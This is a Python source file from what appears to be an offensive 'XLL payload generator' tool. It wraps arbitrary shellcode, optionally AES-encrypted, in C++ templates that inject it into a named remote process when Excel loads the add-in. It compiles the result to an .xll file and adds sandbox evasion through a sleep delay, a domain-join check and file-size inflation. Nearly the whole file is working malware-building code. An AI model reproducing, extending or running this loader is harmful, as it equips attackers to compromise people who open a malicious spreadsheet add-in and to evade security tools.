##
## https://github.com/0xflagplz/Xll-Payload-Generator/blob/main/support.py
##

import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os
import subprocess
import shutil
import struct

# Decryption code templates for different encryption types
decryption_code_templates = {
    'aes': """
{headers}

{sleep_function}
{sandbox_function}

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {{
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {{
        return -1;
    }}
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {{
        return -1;
    }}
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {{
        return -1;
    }}
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {{
        return -1;
    }}

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)payload, (DWORD*)&payload_len)) {{
        return -1;
    }}

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}}
BOOL GetRemoteProcessHandle(LPCWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {{
    PROCESSENTRY32 Proc = {{ sizeof(PROCESSENTRY32) }};
    HANDLE hSnapShot = NULL;

    
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {{
        std::cout << "[!] CreateToolhelp32Snapshot Failed With Error : " << GetLastError() << std::endl;
        goto _EndOfFunction;
    }}

    
    if (!Process32First(hSnapShot, &Proc)) {{
        std::cout << "[!] Process32First Failed With Error : " << GetLastError() << std::endl;
        goto _EndOfFunction;
    }}

    do {{
        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {{
            DWORD dwSize = strlen(Proc.szExeFile);
            DWORD i = 0;

            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            
            if (dwSize < MAX_PATH * 2) {{
                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

                LowerName[i++] = L'\\0';
            }}
        }}

        
        if (wcscmp(LowerName, szProcessName) == 0) {{
            
            *dwProcessId = Proc.th32ProcessID;
            
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                std::cout << "[!] OpenProcess Failed With Error : " << GetLastError() << std::endl;

            break;
        }}

        
        
    }} while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return FALSE;
    return TRUE;
}}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {{
    PVOID pShellcodeAddress = nullptr;
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;

    
    pShellcodeAddress = VirtualAllocEx(hProcess, nullptr, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == nullptr) {{
        std::cout << "[!] VirtualAllocEx Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }}
    std::cout << "[i] Allocated Memory At : 0x" << pShellcodeAddress << std::endl;

    std::cout << "[#] Press <Enter> To Write Payload ... ";
    getchar();

    
    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {{
        std::cout << "[!] WriteProcessMemory Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }}
    std::cout << "[i] Successfully Written " << sNumberOfBytesWritten << " Bytes" << std::endl;

    
    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {{
        std::cout << "[!] VirtualProtectEx Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }}

    std::cout << "[i] Executing Payload ... ";

    
    if (CreateRemoteThread(hProcess, nullptr, 0, LPTHREAD_START_ROUTINE(pShellcodeAddress), nullptr, 0, nullptr) == nullptr) {{
        std::cout << "[!] CreateRemoteThread Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }}
    std::cout << "[+] DONE !" << std::endl;

    return TRUE;
}}

DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {{
    unsigned char Shellcode[] = {{
        {encrypted_data}
    }};
    unsigned char key[16] = {{
        {key}
    }};

    DWORD processId;
    HANDLE processHandle;
    LPCWSTR processNameToFind = L"{process}.exe";

    GetRemoteProcessHandle(processNameToFind, &processId, &processHandle);

    unsigned int payload_len = sizeof(Shellcode);


    AESDecrypt((char*)Shellcode, payload_len, (char*)key, sizeof(key));

    BOOL success = InjectShellcodeToRemoteProcess(processHandle, Shellcode, payload_len);

    if (success) {{
        return 1;
    }}
    else {{
        MessageBoxW(nullptr, L"Failed to inject shellcode.", L"Error", MB_ICONERROR);
        return 0;
    }}

}}

{xlAutoOpen_code}
{dllmain_function}
""",
    'none': """
{headers}

{sleep_function}
{sandbox_function}

BOOL GetRemoteProcessHandle(LPCWSTR szProcessName, DWORD* dwProcessId, HANDLE* hProcess) {{
    PROCESSENTRY32 Proc = {{ sizeof(PROCESSENTRY32) }};
    HANDLE hSnapShot = NULL;

    
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapShot == INVALID_HANDLE_VALUE) {{
        std::cout << "[!] CreateToolhelp32Snapshot Failed With Error : " << GetLastError() << std::endl;
        goto _EndOfFunction;
    }}

    
    if (!Process32First(hSnapShot, &Proc)) {{
        std::cout << "[!] Process32First Failed With Error : " << GetLastError() << std::endl;
        goto _EndOfFunction;
    }}

    do {{
        WCHAR LowerName[MAX_PATH * 2];

        if (Proc.szExeFile) {{
            DWORD dwSize = strlen(Proc.szExeFile);
            DWORD i = 0;

            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            
            if (dwSize < MAX_PATH * 2) {{
                for (; i < dwSize; i++)
                    LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

                LowerName[i++] = L'\\0';
            }}
        }}

        
        if (wcscmp(LowerName, szProcessName) == 0) {{
            
            *dwProcessId = Proc.th32ProcessID;
            
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
            if (*hProcess == NULL)
                std::cout << "[!] OpenProcess Failed With Error : " << GetLastError() << std::endl;

            break;
        }}

        
        
    }} while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
    if (hSnapShot != NULL)
        CloseHandle(hSnapShot);
    if (*dwProcessId == NULL || *hProcess == NULL)
        return FALSE;
    return TRUE;
}}

BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode) {{
    PVOID pShellcodeAddress = nullptr;
    SIZE_T sNumberOfBytesWritten = 0;
    DWORD dwOldProtection = 0;

    
    pShellcodeAddress = VirtualAllocEx(hProcess, nullptr, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == nullptr) {{
        std::cout << "[!] VirtualAllocEx Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }}
    std::cout << "[i] Allocated Memory At : 0x" << pShellcodeAddress << std::endl;

    std::cout << "[#] Press <Enter> To Write Payload ... ";
    getchar();

    
    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {{
        std::cout << "[!] WriteProcessMemory Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }}
    std::cout << "[i] Successfully Written " << sNumberOfBytesWritten << " Bytes" << std::endl;

    
    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeOfShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {{
        std::cout << "[!] VirtualProtectEx Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }}

    std::cout << "[i] Executing Payload ... ";

    
    if (CreateRemoteThread(hProcess, nullptr, 0, LPTHREAD_START_ROUTINE(pShellcodeAddress), nullptr, 0, nullptr) == nullptr) {{
        std::cout << "[!] CreateRemoteThread Failed With Error : " << GetLastError() << std::endl;
        return FALSE;
    }}
    std::cout << "[+] DONE !" << std::endl;

    return TRUE;
}}

DWORD WINAPI ExecuteShellcode(LPVOID lpParam) {{
    unsigned char Shellcode[] = {{
        {encrypted_data}
    }};

    DWORD processId;
    HANDLE processHandle;
    LPCWSTR processNameToFind = L"{process}.exe";

    GetRemoteProcessHandle(processNameToFind, &processId, &processHandle);

    unsigned int payload_len = sizeof(Shellcode);

    BOOL success = InjectShellcodeToRemoteProcess(processHandle, Shellcode, payload_len);

    if (success) {{
        return 1;
    }}
    else {{
        MessageBoxW(nullptr, L"Failed to inject shellcode.", L"Error", MB_ICONERROR);
        return 0;
    }}

}}

{xlAutoOpen_code}
{dllmain_function}
"""
}

# Sleep function
sleep_function = """
BOOL msgo(FLOAT ftMinutes) {{
    DWORD dwMilliSeconds = ftMinutes * 60000;
    DWORD startTick = GetTickCount();
    DWORD endTick = startTick + dwMilliSeconds;
    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    do {{
        DWORD currentTick = GetTickCount();
        if (currentTick >= endTick) {{
            break;
        }}

        DWORD remainingTick = endTick - currentTick;
        MsgWaitForMultipleObjectsEx(1, &hEvent, remainingTick, QS_ALLINPUT, MWMO_ALERTABLE);

    }} while (true);

    CloseHandle(hEvent);

    return TRUE;
}}
"""

# DllMain function
dllmain_function = """
BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved) {{
    switch (ul_reason_for_call) {{
    case DLL_PROCESS_ATTACH:
        
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        
        break;
    }}
    return TRUE;
}}
"""
# framework.h function
header_framework = """
#pragma once
#define WIN32_LEAN_AND_MEAN             
#include <windows.h>
"""
# pch.h function
header_pch = """
#ifndef PCH_H
#define PCH_H
#include "framework.h"
#endif 
"""
# pch.cpp
cpp_pch = """
#include "pch.h"
"""
# struct.h function (indirect calls)
header_struct = """
#pragma once
#include <Windows.h>


typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

typedef LPVOID(WINAPI* VirtualAlloc_t)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect);

typedef VOID(WINAPI* RtlMoveMemory_t)(
    VOID UNALIGNED* Destination,
    const VOID UNALIGNED* Source,
    SIZE_T Length);

typedef FARPROC(WINAPI* RtlCreateUserThread_t)(
    IN HANDLE ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN BOOLEAN CreateSuspended,
    IN ULONG StackZeroBits,
    IN OUT PULONG StackReserved,
    IN OUT PULONG StackCommit,
    IN PVOID StartAddress,
    IN PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientId);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    OUT PHANDLE hThread,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes,
    IN HANDLE ProcessHandle,
    IN PVOID lpStartAddress,
    IN PVOID lpParameter,
    IN ULONG Flags,
    IN SIZE_T StackZeroBits,
    IN SIZE_T SizeOfStackCommit,
    IN SIZE_T SizeOfStackReserve,
    OUT PVOID lpBytesBuffer);

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; 
    PVOID SecurityQualityOfService; 
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* NtCreateSection_t)(
    OUT PHANDLE SectionHandle,
    IN ULONG DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG PageAttributess,
    IN ULONG SectionAttributes,
    IN HANDLE FileHandle OPTIONAL);

typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);


typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;
"""
# Sandbox function
sandbox_function = """
BOOL IsDomainJoined() {{
    LPWSTR lpNameBuffer = NULL;
    NETSETUP_JOIN_STATUS BufferType;
    NET_API_STATUS nStatus;

    nStatus = NetGetJoinInformation(NULL, &lpNameBuffer, &BufferType);

    if (lpNameBuffer != NULL) {{
        NetApiBufferFree(lpNameBuffer);
    }}

    if (nStatus == NERR_Success) {{
        return (BufferType == NetSetupDomainName);
    }}
    else {{
        return FALSE;
    }}
}}
"""

# Headers
headers = """
#include "pch.h"
#include <windows.h>
#include <lm.h>  
#include<iostream>
#include <tlhelp32.h>
#include <string>
#include <algorithm>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "netapi32.lib")
"""

def generate_xlAutoOpen_code(sleep_enabled, sandbox_enabled):
    code = """
extern "C" __declspec(dllexport) int __stdcall xlAutoOpen() {
"""

    if sleep_enabled:
        code += "    msgo(0.1); \n"

    if sandbox_enabled:
        code += """
    if (!IsDomainJoined()) {
        MessageBoxW(NULL, L"The machine is not domain joined. Sorry, we can't run your payload :(", L"Warning", MB_OK | MB_ICONWARNING);
        return 1;
    }
"""

    code += """
    HANDLE hThread = CreateThread(nullptr, 0, ExecuteShellcode, nullptr, 0, nullptr);
    if (hThread == nullptr) {
        return -1;  
    }

    WaitForSingleObject(hThread, INFINITE);  
    CloseHandle(hThread);  
    return 1;  
}
"""

    return code

def AESencrypt(plaintext, key):
    k = hashlib.sha256(key).digest()  # Use the 'key' argument instead of 'KEY'
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext, key

def generate_decryption_code(output_cpp_file, encryption_type, key, encrypted_data, headers, sleep_function, dllmain_function, sandbox_function, sleep_enabled, sandbox_enabled, process_name):
    with open(output_cpp_file, 'w') as cpp_file:
        if encryption_type in decryption_code_templates:
            xlAutoOpen_code = generate_xlAutoOpen_code(sleep_enabled, sandbox_enabled)
            cpp_file.write(
                decryption_code_templates[encryption_type].format(
                    headers=headers,
                    sleep_function=sleep_function,
                    key=key,
                    encrypted_data=encrypted_data,
                    xlAutoOpen_code=xlAutoOpen_code,
                    dllmain_function=dllmain_function,
                    sandbox_function=sandbox_function,
                    process=process_name  # Pass the provided process name
                )
            )
        else:
            raise ValueError("Invalid encryption type. Choose 'aes' or 'none'.")

def generate_more_code(output_dir):
    # Create the 'temp' directory if it doesn't exist
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Define the templates
    templates = {
        'framework.h': header_framework,
        'pch.h': header_pch,
        'pch.cpp': cpp_pch,
        'struct.h': header_struct,
    }

    # Write each template to its respective file
    for file_name, template_content in templates.items():
        file_path = os.path.join(output_dir, file_name)
        with open(file_path, 'w') as file:
            file.write(template_content)

    print(f"Templates written to '{output_dir}'")
    

def generate_c_code(input_file_path, encryption_type, key, sleep_enabled, sandbox_enabled, process):
    try:
        with open(input_file_path, 'rb') as binary_file:
            binary_data = binary_file.read()

        if not encryption_type:
            # Default to 'none' encryption if encryption type is not specified
            encryption_type = 'none'

        if encryption_type.lower() == 'aes':
            # Use the new AESencrypt function for encryption
            encrypted_data, key = AESencrypt(binary_data, key)

            # Format the key as a comma-separated list of bytes in hexadecimal format
            key_str = ', '.join([f"0x{byte:02X}" for byte in key])

            # Format the encrypted data as a C-style array of hexadecimal values
            encrypted_data_str = ', '.join([f"0x{byte:02X}" for byte in encrypted_data])

            # Generate decryption code with sleep and sandbox options
            output_cpp_file = 'temp/main.cpp'  # Save 'main.cpp' in the 'temp' folder
            generate_decryption_code(
                output_cpp_file, encryption_type, key_str, encrypted_data_str,
                headers, sleep_function if sleep_enabled else "",
                dllmain_function, sandbox_function if sandbox_enabled else "",
                sleep_enabled, sandbox_enabled, process
            )

            print(f"Successfully encrypted '{input_file_path}' and saved decryption code to '{output_cpp_file}'")
            print(f"Decryption key: {key.hex()}")

        elif encryption_type.lower() == 'none':
            # Convert binary data to a comma-separated list of bytes in hexadecimal format
            unencrypted_data_str = ', '.join([f"0x{byte:02X}" for byte in binary_data])

            # Use the 'none' template and provide the 'unencrypted_data' argument
            output_cpp_file = 'temp/main.cpp'  # Save 'main.cpp' in the 'temp' folder
            generate_decryption_code(
                output_cpp_file, encryption_type, "", unencrypted_data_str,
                headers, sleep_function if sleep_enabled else "",
                dllmain_function, sandbox_function if sandbox_enabled else "",
                sleep_enabled, sandbox_enabled, process
            )

            print(f"Successfully wrote unencrypted data to '{output_cpp_file}'")

        else:
            raise ValueError("Invalid encryption type. Choose 'aes' or 'none'.")

        print(f"Generated code saved to '{output_cpp_file}'")

    except Exception as e:
        print(f"Error: {e}")

def compile_cpp_to_xll(output_xll):
    try:
        # Append '.dll' file extension if it's missing
        if not output_xll.endswith(".dll"):
            output_xll += ".dll"

        # Check if the XLL file already exists and remove it
        output_xll_renamed = os.path.splitext(output_xll)[0] + ".xll"
        if os.path.exists(output_xll_renamed):
            os.remove(output_xll_renamed)

        compile_command = [
            'g++',                     
            '-shared',                 
            '-o', output_xll,          
            'temp/framework.h',        
            'temp/pch.h',
            'temp/struct.h',
            'temp/pch.cpp',
            'temp/main.cpp'
        ]

        subprocess.check_call(compile_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Rename the output DLL to XLL
        os.rename(output_xll, output_xll_renamed)
        print(f"Successfully compiled to '{output_xll_renamed}'")

    except subprocess.CalledProcessError as e:
        print(f"Error: Compilation failed. {e}")
    except Exception as e:
        print(f"Error: {e}")

def cleanup():
    try:
        # Remove the 'temp' folder and its contents
        shutil.rmtree('temp')
        print("Cleanup: 'temp' folder and its contents removed successfully.")
    except Exception as e:
        print(f"Cleanup failed: {e}")

def inflate(output_xll_file, size):
    file = output_xll_file + ".xll"
    print("[!]\tInflating %s by %s MB" % (file, size))
    blank_bytes = struct.pack('B', 0)
    transformer = open(file, 'ab')
    transformer.write(blank_bytes * 1024 * 1024 * size)
    transformer.close()
    print("[!]\tOperation Complete...\n")
